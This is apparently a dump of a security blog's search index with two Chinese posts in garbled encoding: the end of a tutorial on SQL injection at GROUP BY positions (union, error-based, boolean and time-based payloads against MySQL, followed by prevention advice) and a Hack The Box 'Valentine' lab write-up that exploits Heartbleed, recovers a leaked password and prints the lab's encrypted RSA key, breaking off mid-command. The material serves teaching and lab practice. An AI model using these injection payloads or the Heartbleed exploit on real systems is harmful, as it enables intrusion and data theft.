of SELECT list is not in GROUP BY clause and contains nonaggregated column 'security.users.id' which is not functionally dependent on columns in GROUP BY clause; this is incompatible with sql_mode=only_full_group_by mysql\u003e select * from users where username like 'admin%' group by 4; ERROR 1054 (42S22): Unknown column '4' in 'group statement' mysql\u003e è¿™ä¸ªé”™è¯¯æç¤ºæ˜¯ç”±äºMySQLçš„sql_modeé…ç½®ä¸­å¯ç”¨äº†only_full_group_byæ¨¡å¼ï¼Œå®ƒè¦æ±‚åœ¨ä½¿ç”¨GROUP BYå­å¥æ—¶ï¼ŒSELECTåˆ—è¡¨ä¸­çš„éèšåˆåˆ—å¿…é¡»åŒ…å«åœ¨GROUP BYå­å¥ä¸­ã€‚ ä¸Šè¿°æ¡ˆä¾‹ä¸­idæ˜¯éèšåˆåˆ—ï¼Œæ‰€ä»¥å¿…é¡»è¦å¸¦ä¸Šï¼Œå¦‚ä¸‹ï¼š è¿˜æœ‰ä¸€ç§æƒ…å†µï¼Œ group byåé¢çš„å‚æ•°åªèƒ½æ§åˆ¶ä¸€éƒ¨åˆ†ï¼Œæ¯”å¦‚å¦‚ä¸‹sqlè¯­å¥ï¼š $sql=\"select * from users where username like 'admin%' group by user.$groupby \"; $result=mysql_query($sql); åƒæ¡ˆä¾‹ä¸­å°±æ˜¯è¿™ç§æƒ…å†µï¼Œè¿™ç§æƒ…å†µä¸‹è·å–åˆ—ååªèƒ½å…ˆé—­åˆå‰é¢çš„åˆ—åï¼Œç„¶åéå†ç¬¬äºŒä½çš„æ•°å­—ï¼Œå¦‚ä¸‹ï¼š mysql\u003e select * from users where username like 'admin%' group by users.id,3; +----+----------+----------+ | id | username | password | +----+----------+----------+ | 8 | admin | admin | | 9 | admin1 | admin1 | | 10 | admin2 | admin2 | | 11 | admin3 | admin3 | | 14 | admin4 | admin4 | +----+----------+----------+ 5 rows in set (0.00 sec) mysql\u003e select * from users where username like 'admin%' group by users.id,4; ERROR 1054 (42S22): Unknown column '4' in 'group statement' ","date":"2023-07-27","objectID":"/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/:2:3","tags":["SQLi"],"title":"018-SQLæ³¨å…¥ä¹‹GroupByä½ç½®ç‚¹æ³¨å…¥","uri":"/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/"},{"categories":["Pentest"],"content":"è”åˆæŸ¥è¯¢ æ¥ä¸‹æ¥çœ‹ä¸‹è”åˆæŸ¥è¯¢çš„æƒ…å†µ ä¼—æ‰€å‘¨çŸ¥ï¼ŒWhere åçš„æ³¨å…¥ç‚¹å¯ä»¥ç”¨ union select è”åˆæŸ¥è¯¢ï¼Œå¹¶ä¸”èƒ½æ§åˆ¶å›æ˜¾ä½ç½®ã€‚é‚£ä¹ˆgroup byå‘¢ï¼Ÿ Group by åé¢å¯ä»¥æ¥union selectï¼Œä½†æ— æ³•æ§åˆ¶å›æ˜¾ä½ç½®ã€‚ ä½†ä½†æ˜¯ï¼Œgroup byç”¨äºåˆ†ç±»æŸ¥è¯¢ï¼Œlimitè¯­å¥åªèƒ½æ”¾åœ¨åé¢ä½ç½®ï¼Œå¯ä»¥é€šè¿‡æ³¨é‡Šç¬¦æ³¨é‡Šæ‰å®ƒã€‚ ä¾‹å¦‚ï¼Œæˆ‘ä»¬éœ€è¦æŸ¥è¯¢å‰3ä¸ªç”¨æˆ·åä¸ºadminå¼€å¤´çš„ mysql\u003e select * from users where username like 'admin%' group by id limit 3; +----+----------+----------+ | id | username | password | +----+----------+----------+ | 8 | admin | admin | | 9 | admin1 | admin1 | | 10 | admin2 | admin2 | +----+----------+----------+ 3 rows in set (0.01 sec) mysql\u003e select * from users where username like 'admin%' group by id union select 1,2,3; -- limit 3; +----+----------+----------+ | id | username | password | +----+----------+----------+ | 8 | admin | admin | | 9 | admin1 | admin1 | | 10 | admin2 | admin2 | | 11 | admin3 | admin3 | | 14 | admin4 | admin4 | | 1 | 2 | 3 | +----+----------+----------+ 6 rows in set (0.01 sec) ä¿®æ”¹PHP SQLæŸ¥è¯¢è¯­å¥ï¼š $sql=\"select * from users where username like 'admin%' group by $groupby limit 3\"; $result=mysql_query($sql); è¯•ç€åœ¨group byåé¢æ‹¼æ¥union selectæˆåŠŸï¼š Payload:groupby=id union select 1,user(),version() ","date":"2023-07-27","objectID":"/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/:2:4","tags":["SQLi"],"title":"018-SQLæ³¨å…¥ä¹‹GroupByä½ç½®ç‚¹æ³¨å…¥","uri":"/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/"},{"categories":["Pentest"],"content":"æŠ¥é”™æ³¨å…¥ æŠ¥é”™æ³¨å…¥ä¹Ÿç®€å•ï¼Œç›´æ¥åœ¨group byåç»­ä½ç½®æ’å…¥æŠ¥é”™è¯­å¥å³å¯ï¼š XPathæŠ¥é”™ mysql\u003e select * from users group by 1,(extractvalue(1,concat('~',(select version())))); ERROR 1105 (HY000): XPATH syntax error: '~8.0.31' mysql\u003e mysql\u003e select * from users group by 1, (updatexml(1,concat(0x7e,(select version()),0x7e),1)); ERROR 1105 (HY000): XPATH syntax error: '~8.0.31~' mysql\u003e GeohashæŠ¥é”™ GeohashæŠ¥é”™åœ¨5.7.26ä¸ŠæˆåŠŸäº†ï¼Œä½†æ˜¯åœ¨8.0.31ä¸Šå¤±è´¥äº† # mysql 5.7.26 mysql\u003e select * from users where username like 'admin%' group by users.id,1,(ST_LongFromGeoHash((select version()))); ERROR 1411 (HY000): Incorrect geohash value: '5.7.26' for function ST_LONGFROMGEOHASH mysql\u003e select * from users where username like 'admin%' group by users.id,1,(ST_PointFromGeoHash((select version()),1)); ERROR 1411 (HY000): Incorrect geohash value: '5.7.26' for function st_pointfromgeohash mysql\u003e select * from users where username like 'admin%' group by users.id,1,(ST_LatFromGeoHash((select version()))); ERROR 1411 (HY000): Incorrect geohash value: '5.7.26' for function ST_LATFROMGEOHASH mysql\u003e # mysql 8.0.31 å¤±è´¥ mysql\u003e select * from users where id=2 group by 1,(ST_LongFromGeoHash((select version()))); +----+-------+--------+------+----------+ | id | name | pass | age | area | +----+-------+--------+------+----------+ | 2 | test2 | 543210 | 20 | shanghai | +----+-------+--------+------+----------+ 1 row in set (0.01 sec) GTIDæŠ¥é”™ mysql 5.7.26ä¸ŠæˆåŠŸäº† # mysql 5.7.26 mysql\u003e select * from users where username like 'admin%' group by users.id,(gtid_subtract(version(),1)); ERROR 1772 (HY000): Malformed GTID set specification '5.7.26'. mysql\u003e select * from users where username like 'admin%' group by users.id,(gtid_subset(version(),1)); ERROR 1772 (HY000): Malformed GTID set specification '5.7.26'. mysql 8.0.31å¤±è´¥ ","date":"2023-07-27","objectID":"/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/:2:5","tags":["SQLi"],"title":"018-SQLæ³¨å…¥ä¹‹GroupByä½ç½®ç‚¹æ³¨å…¥","uri":"/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/"},{"categories":["Pentest"],"content":"å¸ƒå°”ç›²æ³¨ å¸ƒå°”ç›²æ³¨è¿™å—ï¼Œæ²¡æƒ³åˆ°å…¶ä»–åŠæ³•ï¼Œä¸€ç§æ˜¯åˆ©ç”¨union select å¦ä¸€ç§æ˜¯åˆ©ç”¨order by çš„å¸ƒå°”ç›²æ³¨å®ç°ã€‚ id order by rand(substr(version(),1,1)='8') å› ä¸ºgroup byåé¢å¯ä»¥æ¥order byï¼Œæ‰€ä»¥é€‚ç”¨äºorder byæ³¨å…¥ç‚¹çš„æ–¹æ³•éƒ½å¯ä»¥ç”¨ã€‚ ","date":"2023-07-27","objectID":"/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/:2:6","tags":["SQLi"],"title":"018-SQLæ³¨å…¥ä¹‹GroupByä½ç½®ç‚¹æ³¨å…¥","uri":"/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/"},{"categories":["Pentest"],"content":"æ—¶é—´ç›²æ³¨ æ—¶é—´ç›²æ³¨æƒ³åˆ°çš„åŠæ³•ä¹Ÿæ˜¯union select å’Œ order byï¼Œä½†æ˜¯éœ€è¦æ³¨æ„çš„æ˜¯ order byä¼šæ ¹æ®æ•°æ®è®°å½•æ•°æŠŠå»¶æ—¶æ”¾å¤§ï¼Œæ¯”å¦‚sleep 1ç§’ï¼Œæœ‰3æ¡è®°å½•ï¼Œåˆ™æ€»å…±å»¶æ—¶ 3ç§’ã€‚ mysql\u003e select * from users group by 1 order by sleep(1); +----+-------+----------+------+-----------+ | id | name | pass | age | area | +----+-------+----------+------+-----------+ | 1 | test1 | 123456 | 18 | beijing | | 2 | test2 | 543210 | 20 | shanghai | | 3 | user1 | qwer1234 | 28 | guangzhou | +----+-------+----------+------+-----------+ 3 rows in set (3.01 sec) æ‰€ä»¥è¿™ç§æ–¹æ³•ä¸æ¨èä½¿ç”¨ï¼Œå°¤å…¶æ˜¯æŸ¥è¯¢å¤§å‹æ•°æ®åº“ã€‚ ","date":"2023-07-27","objectID":"/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/:2:7","tags":["SQLi"],"title":"018-SQLæ³¨å…¥ä¹‹GroupByä½ç½®ç‚¹æ³¨å…¥","uri":"/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/"},{"categories":["Pentest"],"content":"æ€»ç»“ è¦é˜²æ­¢SQLæ³¨å…¥æ”»å‡»ï¼Œå»ºè®®é‡‡å–ä»¥ä¸‹æªæ–½ï¼š ä½¿ç”¨å‚æ•°ç»‘å®šæˆ–é¢„ç¼–è¯‘è¯­å¥ï¼šä½¿ç”¨å‚æ•°åŒ–æŸ¥è¯¢æˆ–é¢„ç¼–è¯‘è¯­å¥ï¼Œå°†ç”¨æˆ·æä¾›çš„è¾“å…¥ä½œä¸ºå‚æ•°ä¼ é€’ç»™SQLæŸ¥è¯¢ï¼Œè€Œä¸æ˜¯å°†å…¶ç›´æ¥æ‹¼æ¥åˆ°æŸ¥è¯¢å­—ç¬¦ä¸²ä¸­ã€‚è¿™æ ·å¯ä»¥é˜²æ­¢æ¶æ„è¾“å…¥è¢«è§£é‡Šä¸ºSQLä»£ç ã€‚ è¾“å…¥éªŒè¯å’Œè¿‡æ»¤ï¼šå¯¹äºåŠ¨æ€ç”Ÿæˆçš„åˆ—åæˆ–è¡¨è¾¾å¼ï¼Œç¡®ä¿å¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œä¸¥æ ¼çš„éªŒè¯å’Œè¿‡æ»¤ï¼Œåªå…è®¸åˆæ³•çš„å€¼å’Œå­—ç¬¦ï¼Œé¿å…å°†æ¶æ„è¾“å…¥ä¼ é€’ç»™SQLæŸ¥è¯¢ã€‚ æœ€å°æƒé™åŸåˆ™ï¼šåœ¨æ•°æ®åº“çš„è®¿é—®æ§åˆ¶ä¸Šï¼Œç¡®ä¿åº”ç”¨ç¨‹åºä½¿ç”¨çš„æ•°æ®åº“è´¦æˆ·å…·æœ‰æœ€å°çš„æƒé™ï¼Œä»…é™äºæ‰§è¡Œå¿…è¦çš„æ“ä½œï¼Œä»¥å‡å°‘æ½œåœ¨çš„æ”»å‡»é¢ã€‚ å¯¹äºæ— æ³•ç›´æ¥è¿›è¡Œé¢„ç¼–è¯‘çš„å†…å®¹ï¼Œéœ€è¦åœ¨ä»£ç å±‚è¿›è¡Œè¿‡æ»¤å’Œå¤„ç†ï¼Œæ¯”å¦‚å¯ä»¥é€šè¿‡æ˜ å°„çš„æ–¹å¼å°†å‰ç«¯æ¥æ”¶çš„å‚æ•°å€¼åŒ¹é…åˆ°åç«¯ç›¸åº”çš„å€¼ï¼Œå†ä¼ å…¥SQLè¿›è¡Œæ“ä½œï¼Œä»è€Œé¿å…å°†æ¶æ„è¾“å…¥ä¼ é€’ç»™SQLæŸ¥è¯¢ã€‚ ä»¥ä¸Šå°±æ˜¯æœ¬æ¬¡åˆ†äº«å…¨éƒ¨å†…å®¹ï¼Œå¦‚æœ‰çº°æ¼ï¼Œæ¬¢è¿å„ä½å¤§ä½¬äº¤æµæŒ‡æ­£ã€‚ å¾®ä¿¡æ‰«ä¸€æ‰«ï¼Œå…³æ³¨è¯¥å…¬ä¼—å· ","date":"2023-07-27","objectID":"/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/:3:0","tags":["SQLi"],"title":"018-SQLæ³¨å…¥ä¹‹GroupByä½ç½®ç‚¹æ³¨å…¥","uri":"/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/"},{"categories":["é¶åœº"],"content":"012-Valentine é¶æœºIPï¼š10.10.10.79 ","date":"2023-05-01","objectID":"/posts/hackthebox-valentine/:1:0","tags":["HTB","OSCP"],"title":"HTBé¶æœº 012 Valentine WriteUp","uri":"/posts/hackthebox-valentine/"},{"categories":["é¶åœº"],"content":"Scan nmapç«¯å£æ‰«æï¼š â”Œâ”€â”€(xavierã‰¿kali)-[~] â””â”€$ sudo nmap -sSV -T4 10.10.10.79 -F Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-29 00:47 CST Nmap scan report for 10.10.10.79 Host is up (0.30s latency). Not shown: 97 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.2.22 ((Ubuntu)) 443/tcp open ssl/http Apache httpd 2.2.22 ((Ubuntu)) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 28.88 seconds è®¿é—®80ã€443ç«¯å£éƒ½æ˜¯å¦‚ä¸‹ä¸€å¼ å›¾ç‰‡ï¼š é€šè¿‡å›¾ç‰‡è”æƒ³åˆ°å¿ƒè„æ»´è¡€æ¼æ´ï¼Œä½¿ç”¨nmapè¿›è¡Œæ¢æµ‹ â”Œâ”€â”€(xavierã‰¿kali)-[~] â””â”€$ ls /usr/share/nmap/scripts | grep ssl rmi-vuln-classloader.nse ssl-ccs-injection.nse ssl-cert-intaddr.nse ssl-cert.nse ssl-date.nse ssl-dh-params.nse ssl-enum-ciphers.nse ssl-heartbleed.nse ssl-known-key.nse ssl-poodle.nse sslv2-drown.nse sslv2.nse â”Œâ”€â”€(xavierã‰¿kali)-[~] â””â”€$ sudo nmap -sSV -T4 10.10.10.79 -p22,443 --script ssl-heartbleed.nse Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-29 00:54 CST Nmap scan report for 10.10.10.79 Host is up (0.32s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0) 443/tcp open ssl/http Apache httpd 2.2.22 ((Ubuntu)) |_http-server-header: Apache/2.2.22 (Ubuntu) | ssl-heartbleed: | VULNERABLE: | The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption. | State: VULNERABLE | Risk factor: High | OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves. | | References: | http://cvedetails.com/cve/2014-0160/ | http://www.openssl.org/news/secadv_20140407.txt |_ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 22.19 seconds æ¢æµ‹ç»“æœè¯´æ˜å¿ƒè„æ»´è¡€æ¼æ´å­˜åœ¨ã€‚ ä¹‹åå…ˆé’ˆå¯¹å¿ƒè„æ»´è¡€æ¼æ´è¿›è¡Œåˆ©ç”¨ï¼ŒåŒæ—¶æ‰«æå…¨ç«¯å£ï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰å¿½ç•¥çš„ä¿¡æ¯ â”Œâ”€â”€(xavierã‰¿kali)-[~] â””â”€$ sudo nmap -sSV -T4 10.10.10.79 -p- Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-29 15:24 CST Nmap scan report for 10.10.10.79 Host is up (0.25s latency). Not shown: 65525 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.2.22 ((Ubuntu)) 443/tcp open ssl/http Apache httpd 2.2.22 ((Ubuntu)) 1983/tcp filtered lhtp 2028/tcp filtered submitserver 19156/tcp filtered unknown 20316/tcp filtered unknown 28245/tcp filtered unknown 50399/tcp filtered unknown 55915/tcp filtered unknown Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 1181.61 seconds ä½¿ç”¨-sC å¯¹ç›¸åº”ç«¯å£è¿›è¡Œæ‰«æï¼Œå‘ç°æ— æ–°å¢ç»“æœï¼Œå°±ä¸å†™ç»†èŠ‚äº†ã€‚ ","date":"2023-05-01","objectID":"/posts/hackthebox-valentine/:2:0","tags":["HTB","OSCP"],"title":"HTBé¶æœº 012 Valentine WriteUp","uri":"/posts/hackthebox-valentine/"},{"categories":["é¶åœº"],"content":"Heartbleed ","date":"2023-05-01","objectID":"/posts/hackthebox-valentine/:3:0","tags":["HTB","OSCP"],"title":"HTBé¶æœº 012 Valentine WriteUp","uri":"/posts/hackthebox-valentine/"},{"categories":["é¶åœº"],"content":"MSF åˆ©ç”¨MSFè¿›è¡Œæ¼æ´åˆ©ç”¨ â”Œâ”€â”€(xavierã‰¿kali)-[~] â””â”€$ msfconsole msf6 \u003e search heartbleed Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 auxiliary/server/openssl_heartbeat_client_memory 2014-04-07 normal No OpenSSL Heartbeat (Heartbleed) Client Memory Exposure 1 auxiliary/scanner/ssl/openssl_heartbleed 2014-04-07 normal Yes OpenSSL Heartbeat (Heartbleed) Information Leak Interact with a module by name or index. For example info 1, use 1 or use auxiliary/scanner/ssl/openssl_heartbleed msf6 \u003e use auxiliary/scanner/ssl/openssl_heartbleed msf6 auxiliary(scanner/ssl/openssl_heartbleed) \u003e set RHOSTS 10.10.10.79 RHOSTS =\u003e 10.10.10.79 msf6 auxiliary(scanner/ssl/openssl_heartbleed) \u003e run [+] 10.10.10.79:443 - Heartbeat response with leak, 65535 bytes [*] 10.10.10.79:443 - Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed msf6 auxiliary(scanner/ssl/openssl_heartbleed) \u003e set VERBOSE True VERBOSE =\u003e true msf6 auxiliary(scanner/ssl/openssl_heartbleed) \u003e exploit [*] 10.10.10.79:443 - Leaking heartbeat response #1 [*] 10.10.10.79:443 - Sending Client Hello... [*] 10.10.10.79:443 - SSL record #1: å¿ƒè„æ»´è¡€æ˜¯ä¸€ä¸ªä¿¡æ¯æ³„éœ²æ¼æ´ï¼Œæ¯æ¬¡æ³„éœ²çš„ä¿¡æ¯å¹¶ä¸ä¸€æ ·ï¼Œæ‰€ä»¥éœ€è¦å¤šæ‰§è¡Œå‡ æ¬¡ã€‚ ","date":"2023-05-01","objectID":"/posts/hackthebox-valentine/:3:1","tags":["HTB","OSCP"],"title":"HTBé¶æœº 012 Valentine WriteUp","uri":"/posts/hackthebox-valentine/"},{"categories":["é¶åœº"],"content":"éMSF æœç´¢EXPï¼š â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/HTB/012-Valentine] â””â”€$ searchsploit heartbleed --------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path --------------------------------------------------------------------------------------------------------- --------------------------------- OpenSSL 1.0.1f TLS Heartbeat Extension - 'Heartbleed' Memory Disclosure (Multiple SSL/TLS Versions) | multiple/remote/32764.py OpenSSL TLS Heartbeat Extension - 'Heartbleed' Information Leak (1) | multiple/remote/32791.c OpenSSL TLS Heartbeat Extension - 'Heartbleed' Information Leak (2) (DTLS Support) | multiple/remote/32998.c OpenSSL TLS Heartbeat Extension - 'Heartbleed' Memory Disclosure | multiple/remote/32745.py --------------------------------------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results æ‰¾ä¸ªåˆ©ç”¨è„šæœ¬è¿›è¡Œåˆ©ç”¨ â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/HTB/012-Valentine] â””â”€$ searchsploit -m multiple/remote/32764.py Exploit: OpenSSL 1.0.1f TLS Heartbeat Extension - 'Heartbleed' Memory Disclosure (Multiple SSL/TLS Versions) URL: https://www.exploit-db.com/exploits/32764 Path: /usr/share/exploitdb/exploits/multiple/remote/32764.py Codes: CVE-2014-0346, CVE-2014-0160, OSVDB-105465 Verified: True File Type: Python script, ASCII text executable Copied to: /home/xavier/Desktop/HTB/012-Valentine/32764.py â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/HTB/012-Valentine] â””â”€$ python2 32764.py -h Usage: 32764.py server [options] Test for SSL heartbeat vulnerability (CVE-2014-0160) Options: -h, --help show this help message and exit -p PORT, --port=PORT TCP port to test (default: 443) æ¼æ´åˆ©ç”¨ï¼š â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/HTB/012-Valentine] â””â”€$ python2 32764.py 10.10.10.79 Trying SSL 3.0... Connecting... Sending Client Hello... Waiting for Server Hello... ... received message: type = 22, ver = 0300, length = 94 ... received message: type = 22, ver = 0300, length = 885 ... received message: type = 22, ver = 0300, length = 331 ... received message: type = 22, ver = 0300, length = 4 Sending heartbeat request... ... received message: type = 24, ver = 0300, length = 16384 Received heartbeat response: 0000: 02 40 00 D8 03 00 53 43 5B 90 9D 9B 72 0B BC 0C .@....SC[...r... 0010: BC 2B 92 A8 48 97 CF BD 39 04 CC 16 0A 85 03 90 .+..H...9....... 0020: 9F 77 04 33 D4 DE 00 00 66 C0 14 C0 0A C0 22 C0 .w.3....f.....\". 0030: 21 00 39 00 38 00 88 00 87 C0 0F C0 05 00 35 00 !.9.8.........5. åŒæ ·ï¼Œå› ä¸ºä¿¡æ¯æ³„éœ²çš„ä¸ç¡®å®šæ€§ï¼Œæˆ‘ä»¬éœ€è¦å¤šæ‰§è¡Œå‡ æ¬¡ï¼Œä»¥å‘ç°æ‰€æœŸæœ›çš„æ•æ„Ÿä¿¡æ¯ã€‚ æ‰§è¡Œäº†å¤šæ¬¡åï¼Œå‘ç°æ³„éœ²äº†å¦‚ä¸‹ä¿¡æ¯ï¼š 0.0.1/decode.php..Content-Type: application/x-www-form-urlencoded..Content-Length: 42....$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==. å¯¹$textçš„å€¼aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==è¿›è¡Œbase64è§£å¯† â”Œâ”€â”€(xavierã‰¿kali)-[~] â””â”€$ echo \"aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==\" | base64 -d heartbleedbelievethehype ","date":"2023-05-01","objectID":"/posts/hackthebox-valentine/:3:2","tags":["HTB","OSCP"],"title":"HTBé¶æœº 012 Valentine WriteUp","uri":"/posts/hackthebox-valentine/"},{"categories":["é¶åœº"],"content":"Webæ‰«æ è¿™è¾¹decode.phpä¹Ÿæç¤ºæˆ‘å¿˜äº†ä¸€ä¸ªç¯èŠ‚ï¼šå¯¹Webè·¯å¾„çš„æ¢æµ‹ï¼Œè¿™é‡Œè¡¥ä¸€ä¸‹ â”Œâ”€â”€(xavierã‰¿kali)-[~] â””â”€$ dirsearch -e php,html,txt -t 100 -u https://10.10.10.79/ Target: https://10.10.10.79/ [16:14:19] Starting: [16:15:27] 301 - 310B - /dev -\u003e https://10.10.10.79/dev/ [16:15:27] 200 - 1KB - /dev/ [16:15:39] 200 - 38B - /index.php è®¿é—®devç›®å½•å¦‚ä¸‹ï¼š æŸ¥çœ‹notes.txt To do: 1) Coffee. 2) Research. 3) Fix decoder/encoder before going live. 4) Make sure encoding/decoding is only done client-side. 5) Don't use the decoder/encoder until any of this is done. 6) Find a better way to take notes. æŸ¥çœ‹hype_keyï¼š ä¸‹è½½hype_key $ wget https://10.10.10.79/dev/hype_key --no-check-certificate ç„¶åé€šè¿‡xxd å¯¹åå…­è¿›åˆ¶è¿›è¡Œè½¬æ¢ï¼š â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/HTB/012-Valentine] â””â”€$ xxd -r -p hype_key -----BEGIN RSA PRIVATE KEY----- Proc-Type: 4,ENCRYPTED DEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46 DbPrO78kegNuk1DAqlAN5jbjXv0PPsog3jdbMFS8iE9p3UOL0lF0xf7PzmrkDa8R 5y/b46+9nEpCMfTPhNuJRcW2U2gJcOFH+9RJDBC5UJMUS1/gjB/7/My00Mwx+aI6 0EI0SbOYUAV1W4EV7m96QsZjrwJvnjVafm6VsKaTPBHpugcASvMqz76W6abRZeXi Ebw66hjFmAu4AzqcM/kigNRFPYuNiXrXs1w/deLCqCJ+Ea1T8zlas6fcmhM8A+8P OXBKNe6l17hKaT6wFnp5eXOaUIHvHnvO6ScHVWRrZ70fcpcpimL1w13Tgdd2AiGd pHLJpYUII5PuO6x+LS8n1r/GWMqSOEimNRD1j/59/4u3ROrTCKeo9DsTRqs2k1SH QdWwFwaXbYyT1uxAMSl5Hq9OD5HJ8G0R6JI5RvCNUQjwx0FITjjMjnLIpxjvfq+E p0gD0UcylKm6rCZqacwnSddHW8W3LxJmCxdxW5lt5dPjAkBYRUnl91ESCiD4Z+uC Ol6jLFD2kaOLfuyee0fYCb7GTqOe7EmMB3fGIwSdW8OC8NWTkwpjc0ELblUa6ulO t9grSosRTCsZd14OPts4bLspKxMMOsgnKloXvnlPOSwSpWy9Wp6y8XX8+F40rxl5 XqhDUBhyk1C3YPOiDuPOnMXaIpe1dgb0NdD1M9ZQSNULw1DHCGPP4JSSxX7BWdDK aAnWJvFglA4oFBBVA8uAPMfV2XFQnjwUT5bPLC65tFstoRtTZ1uSruai27kxTnLQ +wQ87lMadds1GQNeGsKSf8R/rsRKeeKcilDePCjeaLqtqxnhNoFtg0Mxt6r2gb1E AloQ6jg5Tbj5J7quYXZPylBljNp9GVpinPc3KpHttvgbptfiWEEsZYn5yZPhUr9Q r08pkOxArXE2dj7eX+bq65635OJ6TqHbAlTQ1Rs9PulrS7K4SLX7nY89/RZ5oSQe 2VWRyTZ1FfngJSsv9+Mfvz341lbzOIWmk7WfEcWcHc16n9V0IbSNALnjThvEcPky e1BsfSbsf9FguUZkgHAnnfRKkGVG1OVyuwc/LVjmbhZzKwLhaZRNd8HEM86fNojP 09nVjTaYtWUXk0Si1W02wbu1NzL+1Tg9IpNyISFCFYjSqiyG+WU7IwK3YU5kp3CC dYScz63Q2pQafxfSbuv4CMnNpdirVKEo5nRRfK/iaL3X1R3DxV8eSYFKFL6pqpuX cY5YZJGAp+JxsnIQ9CFyxIt92frXznsjhlYa8svbVNNfk/9fyX6op24rL2DyESpY pnsukBCFBkZHWNNyeN7b5GhTVCodHhzHVFehTuBrp+VuPqaqDvMCVe1DZCb4MjAj Mslf+9xK+TXEL3icmIOBRdPyw6e/JlQlVRlmShFpI8eb/8VsTyJSe+b853zuV2qL suLaBMxYKm3+zEDIDveKPNaaWZgEcqxylCC/wUyUXlMJ50Nw6JNVMM8LeCii3OEW l0ln9L1b/NXpHjGa8WHHTjoIilB5qNUyywSeTBF2awRlXH9BrkZG4Fc4gdmW/IzT RUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3 -----END RSA PRIVATE KEY----- å¯ä»¥çœ‹åˆ°æ˜¯ä¸€ä¸ªRSAç§é’¥ï¼Œæ¥ä¸‹å»ç”¨sshè¿›è¡Œè¿æ¥ ","date":"2023-05-01","objectID":"/posts/hackthebox-valentine/:4:0","tags":["HTB","OSCP"],"title":"HTBé¶æœº 012 Valentine WriteUp","uri":"/posts/hackthebox-valentine/"},{"categories":["é¶åœº"],"content":"åˆå§‹shell å¯¹hype_keyè¿›è¡Œè½¬ç ï¼Œå¹¶é€šè¿‡sshè¿›è¡Œè¿æ¥ â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/HTB/012-Valentine] â””â”€$ xxd -r -p hype_key \u003e hype_key.rsa â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/HTB/012-Valentine] â””â”€$ chmod 600 